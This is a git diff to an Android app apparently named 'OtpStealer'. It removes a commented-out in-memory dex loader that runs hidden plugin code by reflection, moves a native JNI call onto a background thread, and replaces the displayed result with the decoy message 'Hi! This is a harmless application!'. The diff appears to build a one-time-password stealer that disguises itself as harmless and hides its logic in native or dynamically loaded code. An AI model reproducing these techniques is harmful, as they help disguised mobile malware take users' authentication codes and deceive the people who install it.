@@ -2,6 +2,7 @@ package com.example.otpstealer
 
 import android.os.Build
 import android.os.Bundle
+import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
@@ -14,8 +15,6 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import com.example.otpstealer.ui.theme.OtpStealerTheme
 import androidx.compose.ui.unit.dp
-import dalvik.system.InMemoryDexClassLoader
-import java.nio.ByteBuffer
 
 
 class MainActivity : ComponentActivity() {
@@ -32,20 +31,10 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        val result = stringFromJNI()
-
-//        val inputStream = resources.openRawResource(R.raw.classes)
-//        val dexBytes = inputStream.readBytes()
-//
-//        val dexBuffer = ByteBuffer.allocateDirect(dexBytes.size)
-//        dexBuffer.put(dexBytes)
-//        dexBuffer.flip()
-//
-//        val classLoader = InMemoryDexClassLoader(dexBuffer, classLoader)
-//        val pluginClass = classLoader.loadClass("com.example.MyPlugin")
-//        val runMethod = pluginClass.getDeclaredMethod("run")
-//        val pluginInstance = pluginClass.getDeclaredConstructor().newInstance()
-//        val result = runMethod.invoke(pluginInstance) as String
+        Thread {
+            val result = stringFromJNI()
+            Log.d("NativeCode", result)
+        }.start()
 
         setContent {
             OtpStealerTheme {
@@ -54,7 +43,7 @@ class MainActivity : ComponentActivity() {
                     color = MaterialTheme.colorScheme.background
                 ) {
                     Text(
-                        text = result,
+                        text = "Hi! This is a harmless application!",
                         modifier = Modifier.padding(16.dp),
                         style = MaterialTheme.typography.bodyLarge
                     )
